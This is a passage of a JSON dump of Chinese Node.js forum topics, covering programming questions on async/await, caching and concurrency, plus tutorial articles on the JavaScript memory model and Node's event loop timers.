请求一千条数据信息， 怎么做缓存。用redis</p>\n</div>","title":"mysql 批量数据请求，怎么做缓存","last_reply_at":"2019-04-15T11:16:36.133Z","good":false,"top":false,"reply_count":0,"visit_count":628,"create_at":"2019-04-15T11:16:36.133Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5cad56a67edd13064e0541ad","author_id":"548d350057fd3ae46b233487","tab":"ask","content":"<div class=\"markdown-text\"><p>本人想将NodeJS代码部署在别人的服务器上，但是担心源码泄露的问题，于是想是否有办法进行代码保护？还请各位大神指点一二。</p>\n</div>","title":"NodeJS如何进行代码保护？","last_reply_at":"2019-04-15T09:58:00.778Z","good":false,"top":false,"reply_count":15,"visit_count":1675,"create_at":"2019-04-10T02:36:22.674Z","author":{"loginname":"jiangbophd","avatar_url":"https://avatars3.githubusercontent.com/u/4505253?v=4&s=120"}},{"id":"5cb4558e207b2365936ed439","author_id":"503dfba9f767cc9a5131ac6c","tab":"ask","content":"<div class=\"markdown-text\"><p>使用 ember-intl 多语言。\n链接：<a href=\"https://github.com/ember-intl/ember-intl\">https://github.com/ember-intl/ember-intl</a></p>\n<p>使用 ember-seo-meta-tags 做 seo。\n链接：<a href=\"https://www.npmjs.com/package/ember-seo-meta-tags\">https://www.npmjs.com/package/ember-seo-meta-tags</a></p>\n<p>如何在 ember-seo-meta-tags 中使用多语言？</p>\n</div>","title":"ember seo 如何使用多语言？","last_reply_at":"2019-04-15T09:57:34.410Z","good":false,"top":false,"reply_count":0,"visit_count":322,"create_at":"2019-04-15T09:57:34.410Z","author":{"loginname":"liuxufei","avatar_url":"https://avatars3.githubusercontent.com/u/1210771?v=4&s=120"}},{"id":"5caf7754dad66d658e4081ca","author_id":"5c4b0027595cbd1e95088843","tab":"share","content":"<div class=\"markdown-text\"><p>#nestjs+typeORM后端开发web系统\n###要求熟练使用git，nestjs，typeorm，参与项目的共同开发。\n###要求一定要有nestjs+typeorm项目经验，新手勿扰。\n###要求有足够的时间来对接和开发项目\n##优先考虑个人自由职业开发人员\n##有angular material前端开发更佳。\n##项目是会员管理系统\nvx:     fengvipp</p>\n</div>","title":"外包-远程合作-nestjs+typeORM后端开发web系统","last_reply_at":"2019-04-15T09:55:51.195Z","good":false,"top":false,"reply_count":3,"visit_count":830,"create_at":"2019-04-11T17:20:20.548Z","author":{"loginname":"haishangfeng","avatar_url":"https://avatars3.githubusercontent.com/u/47029980?v=4&s=120"}},{"id":"5cb356d7dad66d658e408d2b","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>funtion(param1,param2,async function(err, result){\n\tlet a = await p1(result);\n\t…\n\t…\n\t…\n});\n这种写法可以吗？</p>\n</div>","title":"想在回调函数里调用await，是否要将回调修饰成async","last_reply_at":"2019-04-15T09:04:34.461Z","good":false,"top":false,"reply_count":4,"visit_count":480,"create_at":"2019-04-14T15:50:47.557Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"5cb34d4bdad66d658e408d00","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>let func1 = async function(){\ntry {\n\t  let a = await p1(0);\n\t  let b = await p2(a);\nreturn Promise.resolve(b);\n} catch (error) {\nreturn Promise.reject(error);\n}\n}</p>\n<p>let func2 = async function(){\ntry {\nlet result =  await func1();\n} catch (error) {\nconsole.log(error);\n}\n}\n像这样的写法可以吗？我自己node出来的结果显示是正确的。请问还有更好的写法吗？</p>\n</div>","title":"async函数return出去的结果如何被调用的async函数的await获取？","last_reply_at":"2019-04-15T06:16:34.732Z","good":false,"top":false,"reply_count":4,"visit_count":424,"create_at":"2019-04-14T15:10:03.760Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"5cb3f6eadad66d658e408ee8","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 从内存角度理解 let 和 const 的意义。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000018854431\">JavaScript 是如何工作的：JavaScript 的内存模型</a></li>\n<li>作者：<a href=\"https://segmentfault.com/u/minnanitkong\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>这是专门探索 JavaScript 及其所构建的组件的系列文章的第 21 篇。</p>\n<p>如果你错过了前面的章节，可以在这里找到它们：</p>\n<ol>\n<li><a href=\"https://segmentfault.com/a/1190000017352941\">JavaScript 是如何工作的：引擎，运行时和调用堆栈的概述！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017369465\">JavaScript 是如何工作的：深入 V8 引擎&amp;编写优化代码的 5 个技巧！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017392370\">JavaScript 是如何工作的：内存管理+如何处理 4 个常见的内存泄漏！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017419328\">JavaScript 是如何工作的：事件循环和异步编程的崛起+ 5 种使用 async/await 更好地编码方式！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017448270\">JavaScript 是如何工作的：深入探索 websocket 和 HTTP/2 与 SSE +如何选择正确的路径！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017485968\">JavaScript 是如何工作的：与 WebAssembly 比较 及其使用场景！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017578650\">JavaScript 是如何工作的：Web Workers 的构建块+ 5 个使用他们的场景!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017749922\">JavaScript 是如何工作的：Service Worker 的生命周期及使用场景!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017794020?_ea=6014340#articleHeader0\">JavaScript 是如何工作的：Web 推送通知的机制!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017832686\">JavaScript 是如何工作的：使用 MutationObserver 跟踪 DOM 的变化!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017872125#articleHeader0\">JavaScript 是如何工作的：渲染引擎和优化其性能的技巧!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017903157\">JavaScript 是如何工作的：深入网络层 + 如何优化性能和安全!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017927665\">JavaScript 是如何工作的：CSS 和 JS 动画底层原理及如何优化它们的性能！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017961297\">JavaScript 是如何工作的：解析、抽象语法树（AST）+ 提升编译速度 5 个技巧!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017992671\">JavaScript 是如何工作的：深入类和继承内部原理+Babel 和 TypeScript 之间转换!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018020391\">JavaScript 是如何工作的：存储引擎+如何选择合适的存储 API!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018033709\">JavaScript 是如何工作的：Shadow DOM 的内部结构+如何编写独立的组件！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018046292\">JavaScript 是如何工作的：WebRTC 和对等网络的机制！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018059329\">JavaScript 是如何工作的：编写自己的 Web 开发框架 + React 及其虚拟 DOM 原理!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018140746#articleHeader0\">JavaScript 是如何工作的：模块的构建以及对应的打包工具</a></li>\n</ol>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 声明一些变量并初始化它们\nvar a = 5;\nlet b = &quot;xy&quot;;\nconst c = true;\n\n&#x2F;&#x2F; 分配新值\na = 6;\nb = b + &quot;z&quot;;\nc = false; &#x2F;&#x2F;  类型错误:不可对常量赋值\n</code></pre><p>作为程序员，声明变量、初始化变量(或不初始化变量)以及稍后为它们分配新值是我们每天都要做的事情。</p>\n<p>但是当这样做的时候会发生什么呢? JavaScript 如何在内部处理这些基本功能? 更重要的是，作为程序员，理解 JavaScript 的底层细节对我们有什么好处。</p>\n<p>下面，我打算介绍以下内容:</p>\n<ul>\n<li>JS 原始数据类型的变量声明和赋值</li>\n<li>JavaScript 内存模型：调用堆栈和堆</li>\n<li>JS 引用类型的变量声明和赋值</li>\n<li><code>let</code> vs <code>const</code></li>\n</ul>\n<h3>JS 原始数据类型的变量声明和赋值</h3>\n<p>让我们从一个简单的例子开始。下面，我们声明一个名为<code>myNumber</code>的变量，并用值<code>23</code>初始化它。</p>\n<pre class=\"prettyprint language-javascript\"><code>let myNumber = 23;\n</code></pre><p>当执行此代码时，JS 将执行:</p>\n<ol>\n<li>为变量(<code>myNumber</code>)创建唯一标识符(<strong>identifier</strong>)。</li>\n<li>在内存中分配一个地址(在运行时分配)。</li>\n<li>将值 <code>23</code> 存储在分配的地址。</li>\n</ol>\n<p><img src=\"https://image.fundebug.com/2019-0415-01.png\" alt></p>\n<p>虽然我们通俗地说，<code>“myNumber 等于 23”</code>，更专业地说，<code>myNumber</code> 等于保存值 23 的内存地址，这是一个值得理解的重要区别。</p>\n<p>如果我们要创建一个名为 <code>newVar</code> 的新变量并把 <code>myNumber</code> 赋值给它。</p>\n<pre class=\"prettyprint language-javascript\"><code>let newVar = myNumber;\n</code></pre><p>因为 <code>myNumber</code> 在技术上实际是等于 “<code>0012CCGWH80</code>”，所以 <code>newVar</code> 也等于 “<code>0012CCGWH80</code>”，这是保存值为<code>23</code>的内存地址。通俗地说就是 <code>newVar</code> 现在的值为 <code>23</code>。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-02.png\" alt></p>\n<p>因为 <code>myNumber</code> 等于内存地址 <code>0012CCGWH80</code>，所以将它赋值给 <code>newVar</code> 就等于将<code>0012CCGWH80</code> 赋值给 <code>newVar</code>。</p>\n<p>现在，如果我这样做会发生什么:</p>\n<pre class=\"prettyprint language-javascript\"><code>myNumber = myNumber + 1;\n</code></pre><p><code>myNumber</code>的值肯定是 24。但是<code>newVar</code>的值是否也为 24 呢？，因为它们指向相同的内存地址？</p>\n<p>答案是否定的。由于 JS 中的原始数据类型是不可变的，当 <code>myNumber + 1</code> 解析为<code>24</code>时，JS 将在内存中分配一个新地址，将<code>24</code>作为其值存储，<code>myNumber</code>将指向新地址。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-03.png\" alt></p>\n<p>这是另一个例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>let myString = &quot;abc&quot;;\nmyString = myString + &quot;d&quot;;\n</code></pre><p>虽然一个初级 JS 程序员可能会说，字母<code>d</code>只是简单在原来存放<code>adbc</code>内存地址上的值，从技术上讲，这是错的。当 <code>abc</code> 与 <code>d</code> 拼接时，因为字符串也是 JS 中的基本数据类型，不可变的，所以需要分配一个新的内存地址，<code>abcd</code> 存储在这个新的内存地址中，<code>myString</code> 指向这个新的内存地址。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-04.png\" alt></p>\n<p>下一步是了解原始数据类型的内存分配位置。</p>\n<h3>JavaScript 内存模型：调用堆栈和堆</h3>\n<p>JS 内存模型可以理解为有两个不同的区域:<strong>调用堆栈(call stack)<strong>和</strong>堆(heap)</strong>。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-05.png\" alt></p>\n<p>调用堆栈是存放原始数据类型的地方(除了函数调用之外)。上一节中声明变量后调用堆栈的粗略表示如下。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-06.png\" alt></p>\n<p>在上图中，我抽象出了内存地址以显示每个变量的值。 但是，不要忘记实际上变量指向内存地址，然后保存一个值。 这将是理解 <code>let vs. const</code> 一节的关键。</p>\n<p><strong>堆</strong>是存储引用类型的地方。跟调用堆栈主要的区别在于，堆可以存储无序的数据，这些数据可以动态地增长，非常适合数组和对象。</p>\n<h3>JS 引用类型的变量声明和赋值</h3>\n<p>让我们从一个简单的例子开始。下面，我们声明一个名为<code>myArray</code>的变量，并用一个空数组初始化它。</p>\n<pre class=\"prettyprint language-javascript\"><code>let myArray = [];\n</code></pre><p>当你声明变量“<code>myArray</code>”并为其指定非原始数据类型（如“[]”）时，以下是在内存中发生的情况：</p>\n<ol>\n<li>为变量创建唯一标识符（“<code>myArray</code>”）</li>\n<li>在内存中分配一个地址（将在运行时分配）</li>\n<li>存储在堆上分配的内存地址的值（将在运行时分配）</li>\n<li>堆上的内存地址存储分配的值（空数组[]）</li>\n</ol>\n<p><img src=\"https://image.fundebug.com/2019-0415-07.png\" alt></p>\n<p><img src=\"https://image.fundebug.com/2019-0415-08.png\" alt></p>\n<p>从这里，我们可以 <code>push</code>, <code>pop</code>，或对数组做任何我们想做的。</p>\n<pre class=\"prettyprint language-javascript\"><code>myArray.push(&quot;first&quot;);\nmyArray.push(&quot;second&quot;);\nmyArray.push(&quot;third&quot;);\nmyArray.push(&quot;fourth&quot;);\nmyArray.pop();\n</code></pre><p><img src=\"https://image.fundebug.com/2019-0415-09.png\" alt></p>\n<p><strong>代码部署后可能存在的 BUG 没法实时知道，事后为了解决这些 BUG，花了大量的时间进行 log 调试，这边顺便给大家推荐一个好用的 BUG 监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>let <code>vs</code> const</h3>\n<p>一般来说，我们应该尽可能多地使用<code>const</code>，只有当我们知道某个变量将发生改变时才使用<code>let</code>。</p>\n<p>让我们明确一下我们所说的**“改变”**是什么意思。</p>\n<pre class=\"prettyprint language-javascript\"><code>let sum = 0;\nsum = 1 + 2 + 3 + 4 + 5;\nlet numbers = [];\nnumbers.push(1);\nnumbers.push(2);\nnumbers.push(3);\nnumbers.push(4);\nnumbers.push(5);\n</code></pre><p>这个程序员使用<code>let</code>正确地声明了<code>sum</code>，因为他们知道值会改变。但是，这个程序员使用<code>let</code>错误地声明了数组 <code>numbers</code> ，因为他将把东西推入数组理解为<strong>改变数组的值</strong>。</p>\n<p>解释**“改变”**的正确方法是更改<code>内存地址</code>。<code>let</code> 允许你更改内存地址。<code>const</code> 不允许你更改内存地址。</p>\n<pre class=\"prettyprint language-javascript\"><code>const importantID = 489;\nimportantID = 100; &#x2F;&#x2F; 类型错误:赋值给常量变量\n</code></pre><p>让我们想象一下这里发生了什么。</p>\n<p>当声明<code>importantID</code>时，分配了一个内存地址，并存储<code>489</code>的值。记住，将变量<code>importantID</code>看作等于内存地址。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-10.png\" alt></p>\n<p>当将<code>100</code>分配给<code>importantID</code>时，因为<code>100</code>是一个原始数据类型，所以会分配一个新的内存地址，并将<code>100</code>的值存储这里。</p>\n<p>然后 JS 尝试将新的内存地址分配给 <code>importantID</code>，这就是抛出错误的地方，这也是我们想要的行为，因为我们不想改变这个 <code>importantID</code>的值。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-11.png\" alt></p>\n<p>当你将<code>100</code>分配给<code>importantID</code>时，实际上是在尝试分配存储<code>100</code>的新内存地址，这是不允许的，因为<code>importantID</code>是用<code>const</code>声明的。</p>\n<p>如上所述，假设的初级 JS 程序员使用<code>let</code>错误地声明了他们的数组。相反，他们应该用<code>const</code>声明它。这在一开始看起来可能令人困惑，我承认这一点也不直观。</p>\n<p>初学者会认为数组只有在我们可以改变的情况下才有用，<code>const</code> 使数组不可变，那么为什么要使用它呢？ <strong>请记住</strong>:<strong>“改变”<strong>是指改变内存地址。让我们深入探讨一下为什么使用</strong>const</strong>声明数组是完全可以的。</p>\n<pre class=\"prettyprint language-javascript\"><code>const myArray = [];\n</code></pre><p>在声明 <code>myArray</code> 时，将在调用堆栈上分配内存地址，该值是在堆上分配的内存地址。堆上存储的值是实际的空数组。想象一下，它是这样的:</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-12.png\" alt></p>\n<p><img src=\"https://image.fundebug.com/2019-0415-13.png\" alt></p>\n<p>如果我们这么做:</p>\n<pre class=\"prettyprint language-javascript\"><code>myArray.push(1);\nmyArray.push(2);\nmyArray.push(3);\nmyArray.push(4);\nmyArray.push(5);\n</code></pre><p><img src=\"https://image.fundebug.com/2019-0415-14.png\" alt></p>\n<p>执行 <code>push</code> 操作实际是将数字放入堆中存在的数组。而 <code>myArray</code> 的内存地址没有改变。这就是为什么虽然使用<code>const</code>声明了 myArray，但没有抛出任何错误。</p>\n<p><code>myArray</code> 仍然等于 <code>0458AFCZX91</code>，它的值是另一个内存地址<code>22VVCX011</code>，它在堆上有一个数组的值。</p>\n<p>如果我们这样做，就会抛出一个错误：</p>\n<pre class=\"prettyprint language-javascript\"><code>myArray = 3;\n</code></pre><p>由于 <code>3</code> 是一个原始数据类型，因此生成一个新的调用堆栈上的内存地址，其值为 <code>3</code>，然后我们将尝试将新的内存地址分配给 <code>myArray</code>，由于 myArray 是用 const 声明的，所以这是不允许的。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-15.png\" alt></p>\n<p>另一个会抛出错误的例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>myArray = [&quot;a&quot;];\n</code></pre><p>由于<code>[a]</code>是一个新的引用类型的数组，因此将分配调用堆栈上的一个新内存地址，并存储<strong>堆</strong>上的一个内存地址的值，其它值为 <code>[a]</code>。然后，我们尝试将调用堆栈内存地址分配给 <code>myArray</code>，这会抛出一个错误。</p>\n<p><img src=\"https://image.fundebug.com/2019-0415-16.png\" alt></p>\n<p>对于使用<code>const</code>声明的对象（如数组），由于对象是引用类型，因此可以添加键，更新值等等。</p>\n<pre class=\"prettyprint language-javascript\"><code>const myObj = {};\nmyObj[&quot;newKey&quot;] = &quot;someValue&quot;; &#x2F;&#x2F; 这不会抛出错误\n</code></pre><h3>为什么这些知识对我们有用呢</h3>\n<p>JavaScript 是世界上排名第一的编程语言（<a href=\"https://insights.stackoverflow.com/survey/2018/\">根据 GitHub 和 Stack Overflow 的年度开发人员调查</a>）。 掌握并成为“JS 忍者”是我们所有人都渴望成为的人。</p>\n<p>任何质量好的的 JS 课程或书籍都提倡使用<code>let, const</code> 来代替 <code>var</code>，但他们并不一定说出原因。 对于初学者来说，为什么某些 <strong>const</strong> 变量在“改变”其值时会抛出错误而其他 <strong>const</strong>变量却没有。 对我来说这是有道理的，为什么这些程序员默认使用<strong>let</strong>到处避免麻烦。</p>\n<p>但是，不建议这样做。谷歌拥有世界上最好的一些程序员，在他们的 JavaScript 风格指南中说，使用 <strong>const</strong> 或 <strong>let</strong> 声明所有本地变量。默认情况下使用 <strong>const</strong>，除非需要重新分配变量，不使用 <strong>var</strong> 关键字(<a href=\"https://google.github.io/styleguide/jsguide.html#features-use-const-and-let\">原文</a>)。</p>\n<p>虽然他们没有明确说明原因，但据我所知，有几个原因</p>\n<ul>\n<li>先发制人地限制未来的 bug。</li>\n<li>使用 <code>const</code> 声明的变量必须在声明时初始化，这迫使程序员经常在范围方面更仔细地放置它们。这最终会导致更好的内存管理和性能。</li>\n<li>要通过代码与任何可能遇到它的人交流，哪些变量是不可变的(就 JS 而言)，哪些变量可以重新分配。</li>\n</ul>\n<p>希望上面的解释能帮助你开始明白为什么或者什么时候应该在代码中使用 <strong>let</strong> 和 <strong>const</strong> 。</p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2019/04/15/javascritpt-memory-mechanism/\">https://blog.fundebug.com/2019/04/15/javascritpt-memory-mechanism/</a></p>\n</div>","title":"JavaScript 是如何工作的：JavaScript 的内存模型","last_reply_at":"2019-04-15T03:13:46.938Z","good":false,"top":false,"reply_count":0,"visit_count":626,"create_at":"2019-04-15T03:13:46.938Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5cb1e5c5207b2365936ecae3","author_id":"57d216e13d3520a5387c2b53","tab":"ask","content":"<div class=\"markdown-text\"><p>我知道有个cms叫nodercms,有个论坛系统叫nodebb，有没有博客系统。或者还有什么比较好的开源项目可以看一看。</p>\n</div>","title":"大家好，请问Node有没有开源的博客项目","last_reply_at":"2019-04-15T01:16:50.747Z","good":false,"top":false,"reply_count":4,"visit_count":916,"create_at":"2019-04-13T13:36:05.647Z","author":{"loginname":"a69694510","avatar_url":"https://avatars1.githubusercontent.com/u/20507053?v=4&s=120"}},{"id":"5cb343f6dad66d658e408cdc","author_id":"5b31b09b57137f22415c4f4a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p><strong>该文章阅读需要5分钟,更多文章请点击本人博客<a href=\"https://www.halu886.cn\">halu886</a></strong></p>\n</blockquote>\n<ul>\n<li><a href=\"#%E5%AE%9A%E6%97%B6%E5%99%A8\">定时器</a></li>\n<li><a href=\"#precessnexttick\">precess.nextTick()</a></li>\n<li><a href=\"#setimmediate\">setImmediate()</a></li>\n<li><a href=\"#%E4%BA%8B%E4%BB%B6%E9%A9%B1%E5%8A%A8%E4%B8%8E%E9%AB%98%E6%80%A7%E8%83%BD%E6%9C%8D%E5%8A%A1%E5%99%A8\">事件驱动与高性能服务器</a></li>\n</ul>\n<p>Node除去异步I/O，还有一些与I/O无关的异步API需要特别关注：setTimeout()，setInterval()，setImmediate()，process.nextTick()。</p>\n<h1>定时器</h1>\n<p><code>setTimeOut()</code>和<code>setInterval()</code>和浏览器的API的功能一致的，分别为单次或多次执行任务。实现原理和异步I/O相似。但是不需要I/O线程池参与，定时器创建后会插入定时器红黑树中。在每一次的Tick中，定时器观察者会从红黑树迭代取出一个定时器，判断是否超时，如果超时会执行这个定时器的回调。</p>\n<p>如图所示，两者的行为是一致的，不过<code>setInterval()</code>是重复的。</p>\n<p>定时器的问题在于不精确。例如，一个定时器任务是10ms后执行，但是当9毫秒时，有个任务占用了CPU时间片5毫秒，那么当14毫秒时才能执行定时器任务，此时已经逾期了4ms。</p>\n<p><img src=\"http://resource.halu886.cn/images/async-io-4/1.png?x-oss-process=style/halu-blog-watermark\" alt=\"1\"></p>\n<h1>precess.nextTick()</h1>\n<p>当未了解<code>process.nextTick()</code>时,为了立即执行一个异步任务，会这样实现</p>\n<pre class=\"prettyprint language-js\"><code>setTimeout(function(){\n    &#x2F;&#x2F;TODO\n},0);\n</code></pre><p>由于定时器的特点，不够精确。并且，创建和迭代一个定时器，需要动用红黑树，这样时比较浪费性能的。但是<code>process.nextTice()</code>是比较轻量级的。</p>\n<pre class=\"prettyprint language-js\"><code>process.nextTick = function(callback){\n    if(process._exiting) return;\n\n    if(tickDepth &gt;= process.maxTickDepth)\n        maxTickWarn();\n    \n    var tock = { callback: callback};\n    if(process.domain) tock.domain = process.domain;\n    nextTickQueue.push(tock);\n    if(nextTickQueue.length){\n        process._needTickCallback();\n    }\n}\n</code></pre><p>调用<code>process.nextTick()</code>，只会将回调函数放入队列中，下一轮Tick取出。定时器中的红黑树的时间复杂度为O(lg(n)),<code>nextTick()</code>的时间复杂度为O(1)。所以<code>process.nextTick()</code>更加高效。</p>\n<h1>setImmediate()</h1>\n<p><code>setImmediate()</code>与<code>process.nextTick()</code>功能相似，都是将回调延期执行。但是在Nodev0.9.0之前，<code>setImmediate()</code>还未实现，所以相关功能主要是通过<code>process.nextTick()</code>。<br>\n例如:</p>\n<pre class=\"prettyprint language-js\"><code>process.nextTick(function(){\n    console.log(&#x27;延期执行&#x27;);\n})\nconsole.log(&#x27;正常执行&#x27;);\n&#x2F;&#x2F;正常执行\n&#x2F;&#x2F;延期执行  \n</code></pre><p>而用<code>setImmedieate()</code>实现时，相关代码如下：</p>\n<pre class=\"prettyprint language-js\"><code>setImmediate(function(){\n    console.log(&#x27;延期执行&#x27;);\n})\nconsole.log(&#x27;正常执行&#x27;);\n&#x2F;&#x2F;正常执行\n&#x2F;&#x2F;延期执行\n</code></pre><p>其实它们还是有细微差别的，如果将它们放在一起会怎么样呢？</p>\n<pre class=\"prettyprint language-js\"><code>process.nextTick(function(){\n    console.log(&#x27;nextTick延迟执行&#x27;);\n})\nsetImmediate(function(){\n    console.log(&#x27;setImmediate延迟执行&#x27;);\n})\nconsole.log(&#x27;正常执行&#x27;);\n&#x2F;&#x2F; 正常执行\n&#x2F;&#x2F; nextTick延迟执行\n&#x2F;&#x2F; setImmediate延迟执行\n</code></pre><p>从结果上来看，nextTick的优先级高于setImmediate，这是因为事件循环对观察者是有先后顺序的，<code>process.nextTick()</code>是idle观察者，<code>setImmediate()</code>是check观察者。idle观察者优先级高于I/O观察者，I/O观察者优先级高于check观察者。</p>\n<p>具体实现上，<code>process.nextTick()</code>会将回调函数放入一个数组中，而<code>setImmediate()</code>则会将回调放入一个链表中。在每轮循环中，nextTick会将数组中的所有循环全都执行完，而setImmediate则会执行链表中一个回调函数。</p>\n<pre class=\"prettyprint language-js\"><code>process.nextTick(function(){\n    console.log(&#x27;nextTick延迟执行1&#x27;);\n});\n\nprocess.nextTick(function(){\n    console.log(&#x27;nextTick延迟执行2&#x27;);\n})\n\nsetImmediate(function(){\n    console.log(&#x27;setImmediate延迟执行1&#x27;);\n    process.nextTick(function(){\n        console.log(&#x27;强势插入&#x27;);\n    });\n})\n\nsetImmediate(function(){\n    console.log(&#x27;setImmediate延迟执行2&#x27;);\n})\nconsole.log(&#x27;正常执行&#x27;);\n&#x2F;&#x2F;正常执行\n&#x2F;&#x2F;nextTick延迟执行1\n&#x2F;&#x2F;nextTick延迟执行2\n&#x2F;&#x2F;setImmediate延迟执行1\n&#x2F;&#x2F;强势插入\n&#x2F;&#x2F;setImmediate延迟执行2\n</code></pre><p>从执行结果上看，当执行完第一个setImmediate后不是立即执行第二个setImmediate，而是开始下一个循环，按优先级执行process.nextTick()的回调再执行setImmediate()的回调。之所以这样设计是为了每轮循环尽快的结束任务，防止阻塞后续的I/O调用</p>\n<h1>事件驱动与高性能服务器</h1>\n<p>尽管我们前面使用<code>fs.open()</code>作为异步I/O的例子，但是在Node中网络套接字的读取也应用到了异步I/O，网络套接字的监听到请求都会形成事件交给I/O观察者。事件循环不停的处理网络I/O事件，如果Javascript有传入回调函数，这些事件最后会最终传递业务逻辑层进行处理。<br>\n<img src=\"http://resource.halu886.cn/images/async-io-4/2.png?x-oss-process=style/halu-blog-watermark\" alt=\"2\"></p>\n<p>以下是比较经典的服务器模型，下面对比一下他们优缺点:</p>\n<ol>\n<li>同步式，一次只能处理一个请求，其余时候都处于等待状态。</li>\n<li>每进程/每请求，为每个请求启动一个进程，虽然可以处理多个请求，但是不易拓展，比较系统资源有限。</li>\n<li>每线程/每请求，每个请求启动一个线程，虽然线程比进程轻量，但是当高并发请求访问时，也很容易把内存吃光导致服务器缓慢，每线程/每请求比每线程/每请求拓展性更好，但对于大型站点而言依然不够。</li>\n</ol>\n<p>每线程/每请求的方式依旧被Apache采用。Node通过事件循环处理请求，省略了创建线程和销毁线程的开销，通过操作系统在调度任务时线程比较少，上下文切换代价比较低。这使服务器能够有条不紊的处理请求，即使在大量连接的情况下，也不受线程上下文切换的影响，这是Node高性能的一个原因。</p>\n<p>事件驱动的高效已经逐渐被业内重视。例如Nginx，摒弃了多线程的方式，采用了和Node相同的事件驱动。并且如今Nginx大有取代Apache的趋势。Node具有和Nginx相同的特性，不过Nginx采用纯C开发的，新能极高，但是它仅适用于作为Web服务器，用于反向代理或均衡负载等服务，在处理业务方面上较为欠缺。Node则是一个高性能的平台，可以利用它构建与Nginx相同的功能，也可以处理其他业务，两者相比，Node没有Nignx在Web服务器上那么专业，但场景更大，自身性能也不错。</p>\n<blockquote>\n<p>以上知识点均来自&lt;&lt;深入浅出Node.js&gt;&gt;，更多细节建议阅读书籍:-)</p>\n</blockquote>\n</div>","title":"浅谈NodeJs异步I/O-4","last_reply_at":"2019-04-14T14:30:14.406Z","good":false,"top":false,"reply_count":0,"visit_count":363,"create_at":"2019-04-14T14:30:14.406Z","author":{"loginname":"halu886","avatar_url":"https://avatars1.githubusercontent.com/u/22374024?v=4&s=120"}},{"id":"5c8b0a4a7ce0df3732428254","author_id":"5adecaa3a86ec1f308ec2480","tab":"ask","content":"<div class=\"markdown-text\"><p>从学习 Nodejs 以来，听各路大神说 nodejs 的一大优势就是处理高并发。我是非科班出身，对于高并发的理解就是能够同时处理大量请求，第一印象就是每个请求单独起个线程处理，请求与请求之间互不干扰，然鹅…</p>\n<p>用 http 原生代码起一个服务器，接收两个请求：</p>\n<ul>\n<li><code>/a</code>：该接口内部写了个斐波拉契递归函数，执行时间大约 10s 左右</li>\n<li><code>/b</code></li>\n</ul>\n<p>实际起服务后，先请求 <code>/a</code> 接口，再请求 <code>/b</code> 接口。由于 <code>/a</code> 接口被斐波拉契函数阻塞了 10s 左右，惊讶的发现 <code>/b</code> 接口竟然一直要等到 <code>/a</code> 接口跑完才能响应。这说明 http 处理接口是一个处理完再处理下一个的，那么问题来了，10个用户同时请求同一个查询接口，假设每次查询时间为 1s，那岂不是运气差的人拿到响应肯定是在 10 秒之后。</p>\n<p>所谓高并发又到底怎么理解呢？</p>\n<pre class=\"prettyprint\"><code>var http = require(&#x27;http&#x27;)\n\nvar app = http.createServer(function (req, res) {\n    if (req.url === &#x27;&#x2F;a&#x27;) {\n        &#x2F;&#x2F; 斐波拉契函数\n        function fib(n) {\n            if (n === 0) return 0;\n            else if (n === 1) return 1;\n            else return fib(n - 1) + fib(n - 2)\n        }\n        fib(44) &#x2F;&#x2F; 执行时间要 